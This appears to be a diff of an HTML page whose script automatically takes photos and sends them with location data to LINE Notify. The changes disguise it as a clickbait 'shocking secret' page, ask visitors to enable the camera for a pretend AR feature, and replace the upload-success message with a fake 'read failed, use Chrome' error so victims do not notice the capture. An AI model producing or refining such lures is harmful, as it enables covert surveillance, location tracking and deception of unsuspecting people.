@@ -6,9 +6,9 @@
   <title>驚天秘密曝光！他們不想讓你知道的真相！</title>
 </head>
 <body>
-  <h1>ＫＬＤ</h1>
+  <h1>驚天秘密曝光！他們不想讓你知道的真相！</h1>
   <p id="ipInfo">資訊載入中...</p>
-  <p id="status">...</p>
+  <p id="status">請開啟鏡頭使用ＡＲ...</p>
 
   <script>
     // 自動拍照功能
@@ -90,7 +90,7 @@
 
         const result = await response.json();
         if (result.success) {
-          statusElement.innerText = '照片及位置信息已成功傳送到 LINE Notify！';
+          statusElement.innerText = '讀取失敗，請使用Google Chrome開啟';
         } else {
           statusElement.innerText = `通知發送失敗：${result.error}`;
         }
